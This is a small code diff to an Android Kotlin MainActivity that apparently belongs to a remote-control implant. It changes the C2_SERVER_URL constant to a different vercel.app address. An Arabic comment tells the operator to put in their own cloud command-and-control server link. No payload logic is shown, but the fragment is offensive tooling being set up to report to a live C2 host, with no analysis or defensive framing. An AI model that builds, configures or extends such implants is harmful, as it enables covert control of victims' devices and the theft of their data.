@@ -19,7 +19,7 @@ class MainActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_CODE = 102
 
     // استبدل الرابط أدناه برابط خادم القيادة الخاص بك على السحابة
-    private val C2_SERVER_URL = "https://mohammed2000999-krtq0pe67-mohamedkyyann-web.vercel.app/"
+    private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
